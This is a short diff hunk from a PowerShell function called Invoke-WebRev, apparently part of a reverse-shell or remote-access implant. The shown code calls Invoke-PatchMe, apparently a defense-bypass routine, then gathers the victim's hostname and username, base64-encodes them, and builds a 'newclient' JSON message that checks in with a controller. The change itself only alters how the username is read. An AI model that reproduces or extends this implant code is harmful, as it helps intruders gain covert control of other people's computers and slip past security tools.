@@ -35,8 +35,7 @@ function Invoke-WebRev{
     Invoke-PatchMe;
     $pwd_b64 = getPwd;
     $hname = toBase64 -str "$env:computername";
-    $cuser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name;
-    $cuser = toBase64 -str $cuser;
+    $cuser = toBase64 -str "$env:username";
 
     $json = '{"type":"newclient", "result":"", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '"}';
     
